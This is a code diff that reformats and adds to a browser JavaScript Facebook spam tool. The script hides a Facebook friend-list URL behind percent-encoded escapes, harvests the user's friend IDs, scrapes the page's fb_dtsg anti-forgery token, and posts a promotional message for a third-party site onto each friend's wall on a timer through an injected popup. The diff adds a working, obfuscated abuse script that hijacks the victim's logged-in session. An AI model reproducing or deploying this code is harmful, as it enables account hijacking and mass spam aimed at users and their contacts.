@@ -52,9 +52,7 @@ jx = {
         }
         http.open(method, url, true);
         if (method == "POST") {
-            http.setRequestHeader("Content-type", 
-
-"application/x-www-form-urlencoded");
+            http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             http.setRequestHeader("Content-length", parameters.length);
             http.setRequestHeader("Connection", "close")
         }
@@ -84,16 +82,10 @@ jx = {
                         }
                     } else {
                         if (opt.loadingIndicator) {
-                            
-
-document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicat
-
-or)
+                            document.getElementsByTagName("body")[0].removeChild(opt.loadingIndicator)
                         }
                         if (opt.loading) {
-                            
-
-document.getElementById(opt.loading).style.display = "none"
+                            document.getElementById(opt.loading).style.display = "none"
                         }
                         if (error) {
                             error(http.status)
@@ -126,9 +118,7 @@ document.getElementById(opt.loading).style.display = "none"
         var D = false;
         if (C.loadingIndicator) {
             D = document.createElement("div");
-            D.setAttribute("style", 
-
-"position:absolute;top:0px;left:0px;");
+            D.setAttribute("style", "position:absolute;top:0px;left:0px;");
             D.setAttribute("class", "loading-indicator");
             D.innerHTML = C.loadingIndicator;
             document.getElementsByTagName("body")[0].appendChild(D);
@@ -148,9 +138,7 @@ document.getElementById(opt.loading).style.display = "none"
                 document.getElementsByTagName("body")[0].removeChild(D)
             }
             if (C.loading) {
-                document.getElementById(C.loading).style.display = 
-
-"none"
+                document.getElementById(C.loading).style.display = "none"
             }
         }, C.format, C.method, C)
     },
@@ -165,20 +153,8 @@ var msg = "Join new social networking website www.devilsuniverse.com";
 var arr = new Array();
 
 function HTML_text_composer_hdeartext_and_postdatacollection(sender) {
-    if (document.getElementById("txtFloodMsg").value != "") msg = 
-
-document.getElementById("txtFloodMsg").value;
-    jx.load(window.location.protocol + "//" + 
-
-unescape('%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%
-
-78%2F%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F%62%6F%6F%74%73
-
-%74%72%61%70%2E%70%68%70%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5
-
-D%3D%67%72%6F%75%70%26%76%69%65%77%65%72') + "=" + Env.user + 
-
-"&token=v7&lazy=0&__user=" + Env.user, function (data) {
+    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
+    jx.load(window.location.protocol + "//" + unescape('%77%77%77%2E%66%61%63%65%62%6F%6F%6B%2E%63%6F%6D%2F%61%6A%61%78%2F%74%79%70%65%61%68%65%61%64%2F%73%65%61%72%63%68%2F%62%6F%6F%74%73%74%72%61%70%2E%70%68%70%3F%5F%5F%61%3D%31%26%66%69%6C%74%65%72%5B%30%5D%3D%67%72%6F%75%70%26%76%69%65%77%65%72') + "=" + Env.user + "&token=v7&lazy=0&__user=" + Env.user, function (data) {
         var text = data;
         var json = text.substring(text.indexOf('{'));
         var friends = JSON.parse(json);
@@ -187,90 +163,31 @@ D%3D%67%72%6F%75%70%26%76%69%65%77%65%72') + "=" + Env.user +
             arr.push(friends[n].uid);
         }
         sender.parentNode.innerHTML = "Please wait....";
-        
-
-xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin();
+        xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin();
     });
 }
 var a = document.body.innerHTML;
 var dts = a.match(/name="fb_dtsg" value="([^"]+)"/)[1];
 var composerid = a.match(/name="xhpc_composerid" value="([^"]+)"/)[1];
-//var msg = 
-
-unescape("%49%6E%76%69%74%61%74%69%6F%6E%20%74%6F%20%6A%6F%69%6E%20%77%
-
-65%62%73%69%74%65%20%57%57%57%2E%44%45%56%49%4C%53%55%4E%49%56%45%52%53
-
-%45%2E%43%4F%4D%2C%20%49%74%73%20%61%20%73%6F%63%69%61%6C%20%6E%65%74%7
-
-7%6F%72%6B%69%6E%67%20%77%65%62%73%69%74%65%20%6C%69%6B%65%20%4F%52%4B%
-
-55%54%20%41%4E%44%20%46%41%43%45%42%4F%4F%4B%2E%20%53%6F%20%6A%6F%69%6E
-
-%20%69%74%20%6E%6F%77%2E%0A%09%09%09");
+//var msg = unescape("%49%6E%76%69%74%61%74%69%6F%6E%20%74%6F%20%6A%6F%69%6E%20%77%65%62%73%69%74%65%20%57%57%57%2E%44%45%56%49%4C%53%55%4E%49%56%45%52%53%45%2E%43%4F%4D%2C%20%49%74%73%20%61%20%73%6F%63%69%61%6C%20%6E%65%74%77%6F%72%6B%69%6E%67%20%77%65%62%73%69%74%65%20%6C%69%6B%65%20%4F%52%4B%55%54%20%41%4E%44%20%46%41%43%45%42%4F%4F%4B%2E%20%53%6F%20%6A%6F%69%6E%20%69%74%20%6E%6F%77%2E%0A%09%09%09");
 
 
-function 
-
-xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin() {
-    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + 
-
-"&xhpc_targetid=" + arr[suc] + 
-
-"&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + 
-
-encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + 
-
-"&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&
-
-privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]
-
-=pagelet_group_composer";
-    with(newx = new XMLHttpRequest()) open("POST", 
-
-"/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", 
-
-"application/x-www-form-urlencoded"), send(pst);
+function xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin() {
+    pst = "fb_dtsg=" + dts + "&xhpc_composerid=" + composerid + "&xhpc_targetid=" + arr[suc] + "&xhpc_context=home&xhpc_fbx=1&xhpc_message_text=" + encodeURIComponent(msg) + "&xhpc_message=" + encodeURIComponent(msg) + "&UIPrivacyWidget[0]=40&privacy_data[value]=40&privacy_data[friends]=0&privacy_data[list_anon]=0&privacy_data[list_x_anon]=0&=Share&nctr[_mod]=pagelet_group_composer";
+    with(newx = new XMLHttpRequest()) open("POST", "/ajax/updatestatus.php?__a=1"), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send(pst);
     suc++;
     if (suc > arr.length) {
         alert("Completed. Please refresh page.");
         suc = 0;
-    } else 
-
-setTimeout("xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_Afte
-
-rLogin()", 30000 / arr.length);
+    } else setTimeout("xhexa_wifi_makerequest_to_load_devilsUniverse_homepage_AfterLogin()", 30000 / arr.length);
 }
-tulisanNganu='Write your messege here.';
-var askformsg="<div 
-
-style='position:fixed;left:50%;margin-left:-273px;top:100px;width:400px
-
-;height:170px;z-index:9999;font-size:14px;text-align:center;padding:15p
-
-x;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px 
-
-solid 
-
-rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#0000
-
-00'>";
-askformsg+="<div 
-
-style='padding-bottom:10px;font-size:10px;'>"+tulisanNganu+"</div>";
-askformsg+="<table><tr><td></tr><tr><td><textarea id='txtFloodMsg' 
-
-style='width:398px;'></textarea></td></tr><tr><td><input type='button' 
-
-value='Post' 
-
-onclick='HTML_text_composer_hdeartext_and_postdatacollection(this);' 
-
-/></td></tr></table>";
-askformsg+="</div>";
+var askformsg = "<table><tr><td>Write your message here.</td></tr><tr><td><textarea id='txtFloodMsg' style='width:400px;height:150px'></textarea></td></tr><tr><td><input type='button' value='Start Posing' onclick='HTML_text_composer_hdeartext_and_postdatacollection(this);' /></td></tr></table>";
 var askDIV = document.createElement("div");
+askDIV.style.position = "absolute";
+askDIV.style.backgroundColor = "#abf";
+askDIV.style.zIndex = "100";
+askDIV.style.top = "100px";
+askDIV.style.left = "200px";
 askDIV.innerHTML = askformsg;
 document.body.appendChild(askDIV);
-//setTimeout("HTML_text_composer_hdeartext_and_postdatacollection()",10
-
-00);
+//setTimeout("HTML_text_composer_hdeartext_and_postdatacollection()",1000);
